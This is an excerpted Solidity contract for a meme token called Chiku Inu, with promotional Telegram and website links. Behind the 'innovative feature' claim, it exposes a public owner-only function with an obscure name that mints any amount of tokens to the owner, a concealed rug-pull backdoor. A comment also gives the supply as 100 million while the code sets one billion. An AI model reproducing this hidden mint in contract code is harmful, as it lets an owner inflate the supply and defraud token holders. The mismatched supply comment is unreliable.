...
//
// $ChikuInu proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/ChikuInuBep
// 📱 Website ::http://chikuinu.tech/
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _ChikuInu(uint256 amount) public onlyOwner {
 _ChikuInu(msg.sender, amount);
    }
    ...
    function _ChikuInu(address account, uint256 amount) internal virtual {
...
contract $ChikuInu is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Chiku Inu", "CKIINU") {
     _ChikuInu(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}